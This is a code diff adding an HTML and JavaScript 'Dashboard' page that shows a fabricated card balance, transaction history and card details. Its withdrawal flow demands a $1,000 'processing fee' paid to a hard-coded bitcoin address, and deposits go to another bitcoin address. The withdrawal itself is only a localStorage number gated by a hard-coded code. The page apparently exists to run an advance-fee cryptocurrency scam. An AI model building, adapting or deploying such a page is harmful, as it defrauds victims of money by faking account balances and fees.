@@ -1,0 +1,496 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+    <link rel="stylesheet" href="../stylesheet.css">
+</head>
+<body>
+    <div class="welcomeNote">
+        <h2>Welcome!</h2>
+        <h3 class="showCardDetails">Show Card Details</h3>
+    </div>
+    <div class="overallIn">
+        <div class="balanceDiv">
+            <h3>Total Balance:</h3>
+            <h2 id="balance">$300.00</h2>
+            <hr>
+            <div class="recentT">
+                <h3>Recent Trx.</h3>
+
+                <div class="outliner">
+                    <div class="outlinee in"></div>
+                    <h3>$191,401.00</h3>
+                </div>
+                <div class="outliner">
+                    <div class="outlinee in"></div>
+                    <h3>$200.00</h3>
+                </div>
+                <div class="outliner incomeAdded" style="display: none;">
+                    <div class="outlinee out"></div>
+                    <h3 id="widthdrewMoney"></h3>
+                </div>
+            </div>
+            <div class="outliner">
+                <div class="outlinee out"></div>
+                <h3>$190,000.00</h3>
+            </div>
+            <div class="outliner">
+                <div class="outlinee out"></div>
+                <h3>$1,601.10</h3>
+            </div>
+        </div>
+        <div class="imageCard">
+            <img src="../media/phonto-1.JPG" class="debitCard" alt="card image">
+        </div>
+        <div class="contactForm cardDet" style="display: none;">
+            <p>Card Details</p>
+            <h3>Card Number:</h3>
+            <p>5174 2050 3256 7526</p>
+            <h3>Expiration:</h3>
+            <p>12/27</p>
+            <h3>CVV:</h3>
+            <p>147</p>
+        </div>
+    </div>
+
+    <div class="withdrawDeposit">
+        <button class="ddepositng">Deposit</button>
+        <button class="withdraw">Withdraw</button>
+    </div>
+    <div class="contactForm" id="withrawalNote" style="display: none;">
+        <p>
+            You're about to withdraw from your card balance, please select your wallet app.
+        </p>
+        <input type="number" id="amountTo" placeholder="Amount to withdraw" min="0" step="0.01">
+        <select id="selectValue">
+            <option>Select Wallet App</option>
+            <option>MetaMask</option>
+            <option>Trust Wallet</option>
+            <option>Coinbase</option>
+            <option>Exodus</option>
+            <option>Atomic</option>
+            <option>Ledger Nano</option>
+            <option>Bitcoin Core</option>
+            <option>Phantom</option>
+            <option>Binance</option>
+            <option>Kucoin</option>
+            <option>Bybit</option>
+            <option>Luno</option>
+            <option>Revolut</option>
+            <option>Zengo</option>
+            <option>Edge</option>
+            <option>Blockchain</option>
+            <option>Coinomi</option>
+            <option>Guarda</option>
+            <option>Enjin</option>
+            <option>TokenPocket</option>
+            <option>Math</option>
+            <option>XDEFI</option>
+            <option>Bitget</option>
+            <option>Brave</option>
+            <option>Unstoppable</option>
+            <option>BlueWallet</option>
+            <option>Muun</option>
+            <option>Electrum</option>
+            <option>My Ether</option>
+            <option>Jaxx Liberty</option>
+            <option>Blockchain</option>
+            <option>COLDCARD Mk4</option>
+            <option>Trezor Model T</option>
+        </select>
+        <button id="finalProceed">Proceed</button>
+        <div class="back">
+            <h3 class="cancelWithraw" style="cursor: pointer;"><</h3>
+        </div>
+    </div>
+
+    <div class="contactForm chargesDiv" style="display: none;">
+        <p>
+            Please check your inbox of usdt*****@gmail.com for last confirmation
+        </p>
+        <!-- <p>
+            Withdrawal of 191,601.10 is pending. <br> You will need 0.0035 BTC charges for withdrawal to your account to avoid errors or loss of assets.
+        </p> -->
+        <!-- <p style="font-size: 10; width: 100%; margin: 0 10px;">
+            bc1qhtx86fhc0a9tkmeakajstyg <br> r2tgupjnw63cenx
+        </p> -->
+    </div>
+
+    <div class="footerDash">
+        <!-- <div class="firstshift">
+            <h3>Digital Business Transformation</h3>
+            <div class="apartment">
+                <div class="firstApartment">
+                    <div class="innerInner">
+                        <h3>Web Scale</h3>
+                        <p>
+                            Globally make transactions with your card
+                        </p>
+                    </div>
+                    
+                </div>
+                <div class="firstApartment">
+                    <div class="innerInner">
+                        <h3>Accepted Networks</h3>
+                        <p>
+                            Pay for your shoppings without hassles of failed transactions
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div> -->
+
+
+        <div class="secondShift">
+            <div class="innerOne">
+                <h3>Quick Links</h3>
+                <!-- <li class="ddepositng">Deposit</li> -->
+                <a href="#">Products</a>
+                <a href="#">Trials</a>
+                <a href="#">Partners</a>
+                <a href="#">support</a>
+                <a href="#">Training</a>
+                <a href="#">Blogs</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="contactForm" id="pleasePay" style="display: none;">
+            
+            <input type="text" class='walletAdd' placeholder='Enter your wallet Address'>
+        <button id="lastConfirm">Confirm</button>
+    </div>
+
+    <div class="contactForm" id="pleasePay" style="display: none;">
+        <h3>This Withrawal will attract a processing fee of $1,000. Make your payment into this bitcoin address</h3>
+            <p class="mainCoin">bc1qlnv4pks73n9zv3eklf8cne2tgk7mn5zr58s80r</p>
+            <p class="copyBut">Copy</p>
+        <button id="lastConfirm">Confirm</button>
+    </div>
+
+    <div class="contactForm lastNote" id="processing" style="display: none; background-color: rgb(21, 125, 40);">
+        <h3>Please confirm that you're withdrawing on BTC network.. Mismatched address information may result to loss of assets</h3>
+        <div class="contBack">
+            <!-- <button class="mainMenu">Main Menu</button> -->
+            <button class="cancelWith">Confirm</button>
+        </div>
+        <!-- <h3 class="cancelWith" style="cursor: pointer;">Proceed with payment</h3> -->
+    </div>
+    <!-- <div class="contactForm" id="processing" style="display: none; background-color: red;">
+        <h3>Your payment is processing, you'll be credited shortlty <span class="deleter" id="deleteProcessing">X</span></h3>
+    </div> -->
+
+    <!-- <div class="contactForm walletCopied" style="display: none;">
+        <p>Wallet address Copied</p>
+    </div> -->
+
+    <div class="contactForm" id="codeDiv" style="display: none;">
+        <h3>Please Input the code sent to your app box below</h3>
+        <input type="text" id="codeMain" placeholder="Enter Code">
+        <p class="incorrectCode" style="display: none;">Incorrect Code</p>
+        <button id="codeConfirm">Confirm</button>
+    </div>
+
+    <div class="contactForm withdrawSuccess" style="display: none;">
+        <p>Your withdrawal has been processed</p>
+    </div>
+
+
+    <div class="contactForm depp" style="display: none;">
+        <p>Please make your deposit on this wallet address <br> bc1qprdk35m3h3ygds9mahpuhp6pqph36h48s935eh</p>
+        <p class="cancelDeposit" style="cursor: pointer; color: red;">X</p>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Get elements
+    let withrawalBtn = document.querySelector('.withdraw');
+    let withrawalNote = document.getElementById('withrawalNote');
+    let widthdrewMoney = document.getElementById('widthdrewMoney');
+    let balance = document.getElementById('balance');
+    let amountTo = document.getElementById('amountTo');
+    let codeMain = document.getElementById('codeMain');
+    let pleasePay = document.getElementById('pleasePay');
+    let lastConfirm = document.getElementById('lastConfirm');
+    let processing = document.getElementById('processing');
+    let codeDiv = document.getElementById('codeDiv');
+    let mainCoin = document.querySelector('.mainCoin');
+    let copyBut = document.querySelector('.copyBut');
+    let walletCopied = document.querySelector('.walletCopied');
+    let showCardDetails = document.querySelector('.showCardDetails');
+    let withdrawDeposit = document.querySelector('.withdrawDeposit');
+    let imageCard = document.querySelector('.imageCard');
+    let cardDet = document.querySelector('.cardDet');
+    let cancelWithraw = document.querySelector('.cancelWithraw');
+    let cancelWith = document.querySelector('.cancelWith');
+    let lastNote = document.querySelector('.lastNote');
+    let incorrectCode = document.querySelector('.incorrectCode');
+    let incomeAdded = document.querySelector('.incomeAdded');
+    let recentTrx = document.querySelector('.recentT');
+    let withdrawSuccess = document.querySelector('.withdrawSuccess');
+    let chargesDiv = document.querySelector('.chargesDiv');
+    let ddepositng = document.querySelector('.ddepositng');
+    let cancelDeposit = document.querySelector('.cancelDeposit');
+    let depp = document.querySelector('.depp');
+
+    // Initialize application state from localStorage or set defaults
+    let currentBalance = localStorage.getItem('currentBalances') ? 
+        parseFloat(localStorage.getItem('currentBalances')) : 
+        300.10;
+    
+    // Update initial balance display
+    balance.textContent = formatMoney(currentBalance);
+
+    // Load transaction history
+    loadTransactionHistory();
+
+    // Format currency function
+    function formatMoney(amount) {
+        return '$' + amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,');
+    }
+
+    // Save balance to localStorage
+    function saveBalance(amount) {
+        localStorage.setItem('currentBalances', amount.toString());
+    }
+
+    // Save transaction to history
+    function saveTransaction(amount, type) {
+        let transactions = JSON.parse(localStorage.getItem('transactionss')) || [];
+        transactions.push({
+            amount: amount,
+            type: type,
+            date: new Date().toISOString()
+        });
+        localStorage.setItem('transactionss', JSON.stringify(transactions));
+    }
+
+    // Load transaction history
+    function loadTransactionHistory() {
+        let transactions = JSON.parse(localStorage.getItem('transactionss')) || [];
+        
+        // Clear existing transaction displays except the default ones
+        const existingTransactions = recentTrx.querySelectorAll('.outliner:not(:nth-child(2)):not(:nth-child(3))');
+        existingTransactions.forEach(tx => tx.remove());
+        
+        // Show only the last 5 transactions, most recent first
+        const recentTransactions = transactions.slice(-5).reverse();
+        
+        recentTransactions.forEach(tx => {
+            const transactionEl = document.createElement('div');
+            transactionEl.className = 'outliner';
+            transactionEl.innerHTML = `
+                <div class="outlinee ${tx.type === 'withdrawal' ? 'out' : 'in'}"></div>
+                <h3>${formatMoney(tx.amount)}</h3>
+            `;
+            
+            // Insert after the heading (3rd child)
+            recentTrx.insertBefore(transactionEl, recentTrx.children[3]);
+        });
+    }
+
+    const confirmKill = () => {
+        const withdrawAmount = parseFloat(amountTo.value);
+
+        // Validate input
+        if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
+            return;
+        }
+
+        // Check if there's enough balance
+        if (withdrawAmount > currentBalance) {
+            alert("Insufficient funds!");
+            return;
+        }
+
+        // Update balance
+        currentBalance -= withdrawAmount;
+
+        // Save to localStorage
+        saveBalance(currentBalance);
+        saveTransaction(withdrawAmount, 'withdrawal');
+
+        // Update display
+        balance.textContent = formatMoney(currentBalance);
+        updateWithdraw(withdrawAmount);
+        
+        // Refresh transaction history
+        loadTransactionHistory();
+    }
+
+    const updateWithdraw = (withdrawAmount) => {
+        widthdrewMoney.textContent = formatMoney(withdrawAmount);
+        incomeAdded.style.display = 'flex';
+    }
+
+    const checkClick = () => {
+        if(withrawalNote.style.display == 'none'){
+            withrawalNote.style.display = 'flex';
+            pleasePay.style.display = 'none';
+            processing.style.display = 'none';
+        } else {
+            withrawalNote.style.display = 'none';
+        }
+    }
+
+    const mainCode = '4htuos4';
+
+    const confirmCodeInput = () => {
+        let codeMainValue = codeMain.value;
+        if(codeMainValue === mainCode){
+            confirmKill();
+            codeDiv.style.display = 'none';
+            lastNote.style.display = 'none';
+            successWith()
+        } else {
+            incorrectCode.style.display = 'flex';
+            codeDiv.style.backgroundColor = 'red';
+            setTimeout(() => {
+                incorrectCode.style.display = 'none';
+                codeDiv.style.backgroundColor = 'green';
+            }, 1500);
+        }
+    }
+
+    cancelWithraw.addEventListener('click', () => {
+        withrawalNote.style.display = 'none';
+    });
+
+    cancelWith.addEventListener('click', () => {
+        lastNote.style.display = 'none';
+        codeDiv.style.display = 'flex';
+    });
+
+    const payment = () => {
+        let withdrawAmount = document.getElementById('amountTo').value;
+        let selectValue = document.getElementById('selectValue').value;
+        if(withdrawAmount === ''){
+            alert('No amount entered');
+            return;
+        }
+        if(selectValue === 'Select Wallet App'){
+            alert('Please Select a Wallet App');
+            return;
+        }
+
+        if(pleasePay.style.display == 'none'){
+            pleasePay.style.display = 'flex';
+            withrawalNote.style.display = 'none';
+        } else {
+            pleasePay.style.display = 'none';
+        }
+    }
+
+
+
+    
+    // Wallet confirm function
+    const paymentProcessing = () => {
+        if(processing.style.display == 'none'){
+            processing.style.display = 'flex';
+            pleasePay.style.display = 'none';
+            withrawalNote.style.display = 'none';
+            withdrawDeposit.style.display = 'none';
+        } else {
+            processing.style.display = 'none';
+        }
+    }
+
+
+
+
+
+
+
+
+
+
+    const copyAddress = () => {
+        navigator.clipboard.writeText(mainCoin.textContent);
+        if (walletCopied) {
+            walletCopied.style.display = 'flex';
+            setTimeout(() => {
+                walletCopied.style.display = 'none';
+            }, 1500);
+        }
+    }
+
+    const showCardOthers = () => {
+        if(cardDet.style.display === 'none'){
+            cardDet.style.display = 'flex';
+            imageCard.style.display = 'none';
+        } else {
+            cardDet.style.display = 'none';
+            imageCard.style.display = 'flex';
+        }
+    }
+
+    // Deposit functionality
+   // const depositBtn = document.querySelector('.deposit');
+    // if (depositBtn) {
+    //     depositBtn.addEventListener('click', () => {
+    //         const depositAmount = prompt("Enter deposit amount:");
+    //         if (depositAmount && !isNaN(parseFloat(depositAmount)) && parseFloat(depositAmount) > 0) {
+    //             const amount = parseFloat(depositAmount);
+    //             currentBalance += amount;
+    //             saveBalance(currentBalance);
+    //             saveTransaction(amount, 'deposit');
+    //             balance.textContent = formatMoney(currentBalance);
+    //             loadTransactionHistory();
+    //         }
+    //     });
+    // }
+
+    ddepositng.addEventListener('click', () => {
+        depp.style.display = 'flex'
+    })
+
+    cancelDeposit.addEventListener('click', () => {
+        depp.style.display = 'none'
+    })
+
+    const successWith = () => {
+        if(withdrawSuccess.style.display == 'none'){
+            withdrawSuccess.style.display = 'flex';
+        }
+        setTimeout(() => {
+            withdrawSuccess.style.display = 'none';
+            withdrawDeposit.style.display = 'flex'
+        }, 2000);
+    }
+
+    // SHOW WITHDRAWAL FEE ON LOAD
+    const showWithdrawalFee = () => {
+        if(chargesDiv.style.display == 'none'){
+            chargesDiv.style.display = 'flex';
+        }
+    }
+
+    // showWithdrawalFee();
+
+    // Event listeners
+    codeConfirm.addEventListener('click', confirmCodeInput);
+    withrawalBtn.addEventListener('click', checkClick);
+    finalProceed.addEventListener('click', payment);
+    lastConfirm.addEventListener('click', paymentProcessing);
+    if (copyBut) copyBut.addEventListener('click', copyAddress);
+    showCardDetails.addEventListener('click', showCardOthers);
+});
+    </script>
+</body>
+</html>
+
